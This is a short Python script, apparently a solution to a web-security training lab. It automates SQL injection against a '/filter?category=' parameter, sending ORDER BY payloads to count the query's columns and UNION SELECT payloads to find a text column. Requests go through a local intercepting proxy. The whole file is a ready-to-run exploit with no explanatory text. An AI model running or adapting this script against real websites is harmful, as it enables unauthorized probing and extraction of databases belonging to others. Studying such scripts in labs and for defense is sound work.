import string
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.connectionpool.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column(url):
    path = '/filter?category='
    for i in range(1,50):
        sql_payload = "'+order+by+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        if  "Internal Server Error" in r.text:
            return i - 1
        i = i + 1
    return False

def sqli_string_column(url, num_col):
    path = '/filter?category='
    for i in range(1,num_col+1):
        string="'THY0u7'"
        payload_list=['NULL']*num_col
        payload_list[i-1] = string
        sql_payload = "'+union+select+" + ','.join(payload_list) + "--"

        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)

        if string.strip('\'') in r.text:
            return i
    return False

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    print('[+] Figuring out the number of columns....')
    num_col = exploit_sqli_column(url)
    if num_col:
        print('[+] The number of columns is ' + str(num_col))
        print('[+] Figuring out which column contains text')
        string_column=sqli_string_column(url,num_col)
        if string_column:
            print("[+] The column that contains text is " + str(string_column))
    else:
        print('[-] SQLi attack was not successful')
